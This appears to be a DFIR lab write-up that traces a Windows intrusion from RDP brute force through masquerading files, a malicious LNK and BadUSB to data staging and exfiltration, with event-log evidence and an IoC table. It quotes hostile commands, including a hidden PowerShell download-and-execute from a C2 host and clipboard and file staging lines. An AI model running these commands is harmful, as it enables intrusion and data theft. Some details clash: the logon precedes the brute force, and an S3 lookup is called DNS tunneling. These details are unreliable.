# **Windows Threat Detection & DFIR Analysis**

Welcome to the technical documentation of the Cybersecurity-Hub repository. This section walks you through a comprehensive DFIR (Digital Forensics and Incident Response) investigation of a multi-vector attack chain targeting Windows infrastructure.

## ---

**Executive Summary**

During our investigation, we mapped a sophisticated multi-vector intrusion against our Windows environment directly to the MITRE ATT\&CK framework tactics. The attacker successfully gained an initial foothold via brute-force attacks on remote services, leveraged social engineering and malicious file extensions, bypassed endpoint defenses, and ultimately exfiltrated sensitive corporate data through covert DNS channels.

## ---

**1\. Initial Access and Defense Evasion Vectors**

### **A. RDP Brute Force and Network Authentication**

The attack begins at the perimeter. The Remote Desktop Protocol (RDP), running on port 3389, serves as the primary gateway exploited by the adversary. To gain unauthorized administrative entry, the attacker initiates a high-frequency credential stuffing and brute-force campaign against administrative accounts.  
As we examine the Windows Security Event logs, the initial phase of this assault is clearly visible. The system records a massive wave of failed login attempts targeting the administrator account within a very tight time window:

> * **Brute Force Attack (Event ID 4625 \- Failed Logon):**  
  * **Date/Time:** 5/20/2025 between 9:59:46 AM and 9:59:54 AM.  
  * **Recorded Events:** 1,567 failed login attempts.  
  * **TargetUserName:** ADMINISTRATOR  
  * **Status Code:** 0xC000006D (Incorrect username or bad password).

![]()  
Despite multiple security controls, persistent password guessing eventually yields results. Shortly after the brute-force flurry, the telemetry captures an active session establishment. The adversary successfully authenticates remotely via RDP, binding the session to a svchost process managed from an external attacker-controlled IP address:

> * **Successful RDP Logon (Event ID 4624 \- LogonType 10):**  
  * **Date/Time:** 5/20/2025 9:51:49 AM  
  * **LogonType:** 10 (RemoteInteractive \- Remote interactive logon session).  
  * **Source Process:** C:\\Windows\\System32\\svchost.exe  
  * **Attacker Source IP:** 203.205.34.107

![]()  
Concurrently, network-level authentication logs reveal ancillary lateral movement and session handshakes using NTLM v2 protocols originating from an internal workstation within the network perimeter, confirming a broader compromised footprint:

> * **NTLM V2 Network Authentication (Event ID 4624 \- LogonType 3):**  
  * **Date/Time:** 5/20/2025 9:51:47 AM  
  * **LogonType:** 3 (Network Logon via NTLM V2 / NtLmSsp).  
  * **Source Workstation:** DESKTOP-QNBC4UU

![]()

### **B. Phishing & Malicious Files (LNK, Double Extension and ZIP)**

Once inside the perimeter via RDP, the attacker shifts focus to expanding their foothold and introducing auxiliary tooling via social engineering and malicious file distribution. The adversary drops compressed archives and disguised binaries onto the victim's desktop environment.  
Tracing the telemetry back to the browser download event, we observe the initial file acquisition originating from an external web source via Microsoft Edge. The operating system immediately flags the file with a Zone.Identifier, marking it as originating from an untrusted Internet zone:

> * **Download and Zone Identification (Sysmon Event ID 11):**  
  * **Date/Time (UTC):** 2025-05-20 18:58:28.709  
  * **Process:** msedge.exe (PID: 1316\)  
  * **TargetFilename:** C:\\Users\\Administrator\\Downloads\\top-cats.zip:Zone.Identifier

![]()  
Upon extracting the contents of the downloaded ZIP archive using Windows Explorer, the attacker deploys a file masquerading as a standard media asset. However, a closer look at the file path reveals a malicious double extension designed to trick unsuspecting users into executing a compiled binary:

> * **Hidden Executable Extraction (Sysmon Event ID 11):**  
  * **Date/Time (UTC):** 2025-05-20 18:58:43.834  
  * **Process:** Explorer.EXE (PID: 2788\)  
  * **TargetFilename:** C:\\Users\\Administrator\\Pictures\\best-cat.jpg.exe

![]()  
The process creation logs capture the exact moment this disguised file is launched. Spawning directly from the pictures directory, an 8MB executable runs under the guise of an image file, triggering suspicious child processes:

> * **Double Extension Malware Execution (Sysmon Event ID 1):**  
  * **Date/Time (UTC):** 2025-05-20 18:59:06.910  
  * **CommandLine:** "C:\\Users\\Administrator\\Pictures\\best-cat.jpg.exe" (PID: 5484\)  
  * **Technique:** Masquerading (T1036)

![]()  
Inspecting the file properties confirms the deliberate spoofing of the icon and file type, proving how attackers exploit default Windows configurations where known file extensions are hidden from view:  
![]()  
In parallel with binary execution, the adversary utilizes malicious shortcut links (.LNK) to achieve fileless persistence and command execution using native Living-off-the-Land Binaries (LOLBins). The shortcut executes an encoded PowerShell command stealthily in the background without raising any visible windows for the user:

> * **Malicious Shortcut (.LNK / LOLBins):**  
  * **File Name:** Official Website.lnk  
  * **Obfuscated Command:** powershell.exe \-WindowStyle hidden \-c iex (iwr \-UseBasicParsing "http://wp16.hqywlqpa.thm:8000/cgi-bin/f").Content

![]()

### **C. Hardware Vectors: BadUSB / Rubber Ducky (Concept and Risk)**

Beyond software vectors and phishing attachments, sophisticated threat actors frequently evaluate hardware-based intrusion vectors. A prominent example of this is the BadUSB attack vector, which utilizes physical microcontrollers (such as an ESP32-S2 or ATmega32u4) programmed to mimic a Human Interface Device (HID), specifically a standard USB keyboard.  
When plugged into an unattended or unlocked workstation, the operating system trusts the device implicitly because it identifies as a keyboard. The hardware then automatically injects a pre-scripted payload of keystrokes at superhuman speeds—often hundreds of words per minute—bypassing traditional security awareness controls entirely.

#### **Typical Attack Payload Sequence:**

> 1. **Device Insertion:** The malicious USB HID device is connected to the target machine.  
> 2. **Execution Prompt:** The script triggers the Windows Run dialog using the shortcut keys GUI \+ R.  
> 3. **Stealthy Console Spawn:** A hidden command interpreter or PowerShell window is invoked (powershell \-WindowStyle Hidden or cmd /c).  
> 4. **Payload Retrieval:** The system fetches the final payload directly from an external Command and Control (C2) server and executes it entirely in memory via Invoke-Expression (IEX).

#### **DFIR Detection Indicators:**

> * **PowerShell Event ID 400:** Initialization of the PowerShell engine with concealment arguments (-WindowStyle Hidden).  
> * **Sysmon Event ID 1:** Rapid generation of child command shells (cmd.exe or powershell.exe) where the ParentImage is explorer.exe, occurring without any physical user mouse clicks or UI interaction logs.  
> * **Security Event ID 6416:** System audit logs recording the installation and recognition of a new USB Human Interface Device (HID) in the Device Manager.

## ---

**2\. Local Discovery, Post-Exploitation, and Exfiltration**

### **A. Discovery Commands Cheatsheet (Post-Exploitation Enumeration)**

Once initial access and persistence are established, attackers—and conversely, incident responders conducting live triage—execute native system utilities to map out the environment, identify elevated privileges, locate sensitive files, and check for active security defenses.  
The following cheatsheet outlines the primary discovery commands, their technical objectives, and the specific telemetry events required for effective hunting:

| Category | CMD / PowerShell Command | Adversary Objective / Technical Purpose | Telemetry / Events to Audit   |
| :---- | :---- | :---- | :---- |
| **Identity** | whoami /priv | Displays privileges assigned to the current access token (e.g., SeDebugPrivilege, SeImpersonatePrivilege). | Sysmon Event ID 1 / Command Line |
| **Users** | net user / net localgroup administrators | Enumerates local user accounts and members belonging to high-privilege administrative groups. | Sysmon Event ID 1 (net.exe) |
| **System** | systeminfo | Gathers operating system version, architecture, and installed patches (Hotfixes) to check for privilege escalation vulnerabilities. | Sysmon Event ID 1 |
| **Network** | netstat \-ano | Displays active network connections, listening ports, and remote IP addresses mapped to corresponding Process IDs (PIDs). | Sysmon Event ID 1 |
| **Defenses** | tasklist /v | findstr MsSense.exe | Identifies whether Endpoint Detection and Response (EDR) agents or Antivirus software (such as Microsoft Defender) are running. | Sysmon Event ID 1 |
| **Clipboard** | powershell Get-Clipboard | Extracts passwords, API keys, or text tokens recently copied to memory by the user. | Sysmon Event ID 1 / PowerShell Script Block (4104) |
| **Staging** | xcopy ... /i /s /y | Recursively copies directory trees (documents, spreadsheets) to temporary staging directories prior to compression. | Sysmon Event ID 1 / FileCreate (Event ID 11\) |

### **B. DFIR Case Study: Analysis of Evidence**

#### **1\. Defense Evasion and Security Check**

Before proceeding with data aggregation, the adversary queries the running process list to verify if security monitoring software is active. In this telemetry record, the attacker checks specifically for the Microsoft Defender for Endpoint sensor process:

> * **Date/Time (UTC):** 2026-09-09 22:16:13.206  
> * **Event ID:** 1 (Sysmon \- Process Create)  
> * **Image:** C:\\Windows\\System32\\cmd.exe (PID: 3680\)  
> * **Command Line:** cmd /c "tasklist /v | findstr MsSense.exe || echo No MS Defender EDR"

![]()

#### **2\. Initial External Communication Probe**

Following reconnaissance, malware samples executing on the endpoint often perform connectivity checks or preliminary DNS lookups to test outbound routing to infrastructure controlled by the threat actor:

> * **Date/Time (UTC):** 2026-09-09 22:16:13.622  
> * **Event ID:** 22 (Sysmon \- DNS Query)  
> * **Image:** C:\\Users\\Administrator\\Desktop\\Practice\\Task 3\\invoice.pdf.exe (PID: 1896\)  
> * **Query Name:** exfil.beecz.cafe  
> * **Query Status:** 9003 (NXDOMAIN \- Non-Existent Domain)

![]()

#### **3\. Information Collection and Staging**

With defenses mapped and connectivity confirmed, the threat actor transitions to the **Collection** phase. Sensitive information is systematically harvested from across the user profile and concentrated into a temporary directory designated as staging\_58f1.  
First, the contents of the system clipboard—potentially containing sensitive text credentials or session tokens—are dumped directly into a text file:

> * **Clipboard Extraction (PowerShell):**  
  * **Date/Time (UTC):** 2026-09-10 21:16:49.415 | **Event ID:** 1  
  * **Command Line:** powershell \-c "Get-Clipboard \> $env:Temp\\staging\_58f1\\clipboard.txt"

![]()  
Next, the attacker executes bulk file copy operations using xcopy to sweep up document assets, targeting PDF files stored in user directories:

> * **Bulk PDF Document Harvesting:**  
  * **Date/Time (UTC):** 2026-09-10 21:16:50.616 | **Event ID:** 1  
  * **Command Line:** xcopy C:\\Users\\Administrator\\Downloads\\\*.pdf C:\\Users\\ADMINI\~1\\AppData\\Local\\Temp\\2\\staging\_58f1\\downloads /i /s /y

![]()  
The data gathering continues by targeting spreadsheet files to capture financial data, project tracking sheets, or corporate records:

> * **Bulk Spreadsheet Harvesting:**  
  * **Date/Time (UTC):** 2026-09-10 21:16:50 | **Event ID:** 1  
  * **Command Line:** xcopy C:\\Users\\Administrator\\Downloads\\\*.xlsx C:\\Users\\ADMINI\~1\\AppData\\Local\\Temp\\2\\staging\_58f1\\downloads /i /s /y

![]()  
Once all target files are consolidated within the staging tree, the folder is compressed into a single archive file to prepare for stealthy transfer out of the network:

> * **Archive Compression (Staging):**  
  * **Date/Time (UTC):** 2026-09-10 21:16:55.155 | **Event ID:** 1  
  * **Command Line:** powershell \-c "Compress-Archive \-Force \-Path $env:Temp\\staging\_58f1 \-DestinationPath $env:Temp\\staging\_58f1.zip"

![]()

#### **4\. Final Data Exfiltration via DNS**

In the final phase of the attack chain, the malicious staging binary (stealer.exe) transmits the stolen archive across the internet. To bypass standard web proxies and deep packet inspection firewalls, the malware utilizes a covert channel, encoding data chunks into outbound DNS queries directed toward cloud storage infrastructure:

> * **Date/Time (UTC):** 2026-09-10 21:16:58.025  
> * **Event ID:** 22 (Sysmon \- DNS Query)  
> * **Image:** C:\\Users\\Administrator\\Desktop\\Practice\\Task 5\\stealer.exe (PID: 3780\)  
> * **Query Name:** collecteddata-storage-2025.s3.amazonaws.com  
> * **Resolved IP Addresses:** 54.231.136.17, 52.217.65.108, 52.217.128.161, 16.15.255.60, 52.217.204.121, 16.182.70.137, 16.182.67.89, 16.15.244.152  
> * **Query Status:** 0 (SUCCESS)

![]()

## ---

**3\. Complete Indicator of Compromise (IoCs) Matrix**

To conclude this forensic report, the following table summarizes all critical Indicators of Compromise (IoCs) identified throughout the investigation. These artifacts can be utilized by SOC analysts and threat hunters for retrospective log analysis, signature creation, and network defense hardening:

| Category | Indicator / Value | Description / Observation   |
| :---- | :---- | :---- |
| **Affected Hosts** | THM-PC, THM-DFIR-VM-2 | Target endpoints under forensic analysis |
| **Attacker IP** | 203.205.34.107 | External source originating successful RDP logins |
| **Source Workstation** | DESKTOP-QNBC4UU | Client host involved in NTLM v2 authentication |
| **C2 Domain (LNK)** | http://wp16.hqywlqpa.thm:8000/cgi-bin/f | Remote staging server hosting malicious PowerShell scripts |
| **Exfiltration Domain** | collecteddata-storage-2025.s3.amazonaws.com | AWS S3 cloud storage bucket receiving exfiltrated data |
| **Malicious Domain** | exfil.beecz.cafe | Unsuccessful DNS exfiltration test domain |
| **Malicious Archive** | top-cats.zip | Compressed archive downloaded via Microsoft Edge |
| **Malicious Shortcut** | Official Website.lnk | Shortcut file configured with hidden PowerShell execution |
| **Malicious Executable** | best-cat.jpg.exe | 8MB executable disguised as a JPEG image file |
| **Malicious Stealer** | stealer.exe | Compiled binary responsible for staging and exfiltration |
| **Staging Path** | %Temp%\\staging\_58f1 | Temporary directory used for data aggregation |
| **Staging ZIP Path** | %Temp%\\staging\_58f1.zip | Final compressed file prepared for exfiltration |

## ---

**4\. Laboratory Walkthrough & Step-by-Step Incident Reconstruction**

To fully understand how this multi-vector attack manifests in a real-world environment, let's walk through the chronological steps executed inside the DFIR lab. This narrative connects the raw telemetry and artifacts to the attacker's operational mindset during each phase of the exercise.

### **Phase 1: Breaking the Perimeter**

In this initial stage of the lab, the attacker sets their sights on the victim's virtual machine perimeter. Because Remote Desktop Protocol (RDP) was left exposed on port 3389 without adequate account lockout policies, the adversary launches automated scripts to hammer the login screen.  
As we saw in the security logs, thousands of rapid-fire failed authentication attempts flood the event viewer against the built-in administrator account. The attacker isn't worried about noise; they are brute-forcing credentials until the correct combination hits. The moment the correct password is provided, the defense perimeter is breached, and an interactive remote session is established from the external attacker IP 203.205.34.107. Concurrently, internal NTLM v2 handshakes confirm that the adversary is beginning to map adjacent systems within the network boundary.

### **Phase 2: Social Engineering and Execution**

Once inside via RDP, the attacker needs to drop operational tools onto the endpoint without immediately tripping native alarms. This is where social engineering and file masquerading come into play.  
The lab simulation demonstrates how an unsuspecting user downloads a benign-looking archive (top-cats.zip) via the web browser. Behind the scenes, the browser applies a Zone.Identifier ADS (Alternate Data Stream), tagging the file as untrusted. When the user extracts the contents, the attacker relies on a classic Windows annoyance: hidden file extensions. The file is actually named best-cat.jpg.exe. Because Windows hides known extensions by default, the victim sees what looks like a harmless cat picture (.jpg), but double-clicking it actually launches an 8-megabyte executable directly from the pictures directory.  
In parallel, the attacker uses malicious shortcuts (.LNK) containing obfuscated PowerShell commands. When these shortcuts are clicked, they invoke Living-off-the-Land Binaries (LOLBins) to pull payloads directly from a command-and-control web server (wp16.hqywlqpa.thm) entirely in the background, keeping windows hidden from the user's view.

### **Phase 3: Hardware-Based Ingestion (The BadUSB Threat)**

In advanced scenarios explored within this lab module, software-only vectors are complemented by hardware intrusion techniques. The BadUSB simulation highlights what happens when physical security fails.  
Imagine an attacker plugging in what appears to be a standard USB thumb drive or peripheral into an unattended machine. Because the device identifies itself to the operating system as a Human Interface Device (HID)—specifically a USB keyboard—the host computer trusts it unconditionally. Within milliseconds of connection, the microcontroller injects a pre-programmed script. It hits Windows \+ R, opens a hidden command or PowerShell prompt, reaches out to a remote server, and executes in-memory payloads at superhuman typing speeds. For an incident responder, seeing child processes spawn directly from explorer.exe with zero user mouse movement is the definitive signature of an automated HID attack.

### **Phase 4: Local Enumeration and Discovery**

With execution secured and persistent access established, the attacker pauses active exploitation to conduct situational awareness. Before touching sensitive files, they need to know where they stand on the host.  
Using native command-line utilities, the adversary checks user privileges via whoami /priv to see if they possess administrative tokens like SeDebugPrivilege. They enumerate local user accounts and administrators using net commands, inspect active network sockets with netstat to identify open ports and established connections, and run system info queries to check patch levels for potential privilege escalation exploits.  
Crucially, the lab highlights **Defense Evasion**: the attacker executes a quick check against the process list using tasklist and findstr to look specifically for Microsoft Defender's sensor process (MsSense.exe). They need to know if an Endpoint Detection and Response (EDR) agent is watching their every move before they begin harvesting data.

### **Phase 5: Collection, Staging, and Exfiltration**

The final act of the laboratory scenario demonstrates data harvesting and exfiltration. Knowing that valuable intellectual property or documents reside on the workstation, the adversary sets up a staging area in the temporary user directory (%Temp%\\staging\_58f1).  
First, they harvest volatile data by dumping the system clipboard (Get-Clipboard) into a text file, capturing any passwords or sensitive snippets the user recently copied. Next, they use recursive xcopy commands to sweep through download directories, pulling all .pdf and .xlsx documents into the staging folder. Once all target files are gathered, PowerShell's Compress-Archive cmdlet packs everything neatly into a password-protected or compressed bundle (staging\_58f1.zip).  
Finally, to bypass traditional firewall egress monitoring, the malicious stealer binary avoids standard HTTPS or FTP connections. Instead, it encodes the stolen data packets into outbound DNS queries (Event ID 22\) directed at an AWS S3 bucket domain (collecteddata-storage-2025.s3.amazonaws.com). To a naive network monitor, it looks like normal name resolution traffic, but to a trained DFIR analyst reviewing Sysmon logs, this covert DNS tunneling technique represents the climax of the data exfiltration chain.